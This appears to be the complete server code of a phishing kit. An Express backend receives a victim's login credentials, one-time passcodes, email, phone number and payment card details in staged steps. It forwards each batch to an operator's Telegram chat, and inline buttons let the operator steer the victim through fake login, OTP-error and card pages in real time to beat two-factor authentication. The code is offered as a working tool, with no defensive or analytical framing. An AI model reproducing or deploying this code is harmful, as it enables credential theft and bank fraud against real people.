const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fetch = require('node-fetch');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors()); // ✅ Necesario para evitar bloqueo CORS en Render
app.use(bodyParser.json());

const sesiones = new Map();
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
  console.error("❌ BOT_TOKEN o CHAT_ID no definidos en .env o en variables de entorno de Render");
  process.exit(1);
}

// Endpoint raíz para que Render verifique que el servicio está vivo
app.get("/", (req, res) => {
  res.send("🟢 Backend funcionando");
});

const pasos = {
  virtualpersona: "Datos de acceso",
  otp1: "Primer OTP",
  correo: "Correo + Celular",
  otp2: "OTP Error",
  tarjeta: "Datos de Tarjeta"
};

function generarBotones(sessionId) {
  return {
    inline_keyboard: [
      [{ text: "🔁 Volver al Login", callback_data: `index|${sessionId}` }],
      [{ text: "🔐 Ir a OTP1", callback_data: `otp1|${sessionId}` }],
      [{ text: "📧 Ir a Correo", callback_data: `correo|${sessionId}` }],
      [{ text: "❌ OTP Error", callback_data: `otp2|${sessionId}` }],
      [{ text: "💳 Ir a Tarjeta", callback_data: `tarjeta|${sessionId}` }],
      [{ text: "✅ Finalizar", callback_data: `finish|${sessionId}` }]
    ]
  };
}

async function enviarMensajeTelegram(titulo, datos, sessionId) {
  const contenido = Object.entries(datos)
    .map(([k, v]) => `*${k}:* ${v}`)
    .join('\n');

  const payload = {
    chat_id: CHAT_ID,
    text: `📨 *${titulo}*\n\n${contenido}`,
    parse_mode: "Markdown",
    reply_markup: generarBotones(sessionId)
  };

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });
}

// Rutas para recibir los datos desde frontend
for (const ruta in pasos) {
  app.post(`/${ruta}`, async (req, res) => {
    const { sessionId, ...datos } = req.body;
    sesiones.set(sessionId, { redirect_to: null });

    await enviarMensajeTelegram(pasos[ruta], datos, sessionId);
    res.json({ redirectTo: "loader" });
  });
}

// Cliente pregunta por instrucciones
app.get('/instruction/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  const sesion = sesiones.get(sessionId);

  if (sesion?.redirect_to) {
    sesiones.delete(sessionId);
    return res.json({ redirectTo: sesion.redirect_to });
  }

  res.json({});
});

// Webhook de Telegram que cambia la instrucción
app.post('/telegram/webhook', async (req, res) => {
  const { callback_query } = req.body;
  if (!callback_query) return res.sendStatus(200);

  const [accion, sessionId] = callback_query.data.split('|');
  if (sesiones.has(sessionId)) {
    sesiones.set(sessionId, { redirect_to: accion });

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ callback_query_id: callback_query.id })
    });
  }

  res.sendStatus(200);
});

app.listen(PORT, () => {
  console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
});
